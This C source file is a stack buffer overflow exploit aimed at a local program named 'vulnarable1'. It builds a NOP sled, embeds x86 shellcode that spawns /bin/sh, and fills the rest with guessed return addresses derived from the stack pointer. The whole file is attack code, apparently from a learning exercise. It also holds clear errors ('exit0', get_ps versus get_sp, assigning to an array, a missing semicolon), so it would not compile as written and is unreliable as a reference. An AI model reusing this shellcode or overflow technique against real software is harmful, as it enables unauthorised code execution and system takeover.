#include <stdio.h>
#include <stdlib.h>
#define RET                 1024
#define RANGE         200


char shellcode[]=
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07"
	"\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
	"\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff"
	"/bin/sh";
	
unsigned long
get_sp(void)
{
        __asm__("movl %esp,%eax");
}

int
main(int argc,char* argv[])
{
	 int offset=0,bsize=RET+RANGE+1;
	 int i;
	 char buff[bsize],*ptr;
	 long ret;
	 unsigned long sp;
	 
	 if(argc<1)
	 {
	 	printf("There where no offset\n");
	 	exit0;
	 }
	 offset=atoi(argv[1]);
	 sp=get_ps();
	 ret=sp-offset;
	 
	 printf("The stack pointer is: 0x%x\n",sp);
	 printf("The offset is: 0x%x\n",offset);
	 printf("Ret_addr is: 0x%x\n",ret);
	 
	 for(i=0;i<bsize;i+=4)
	 {
	 	*(long *)&buff[i]=ret;
	 }
for(i=0;i<bsize-RANGE*2-strlen(shellcode)-1;i++)
		buff[i]='\x90';
		
	ptr=buff=bsize-RANGE*2-strlen(shellcode)-1;
	for(i=0;i<strlen(shellcode);i++)
        *(ptr++)=shellcode[i];	
        
        buff[bsize-1]='\0'
        
execl("./vulnarable1","./vulnarable1",buff,0);
	 
}
	 
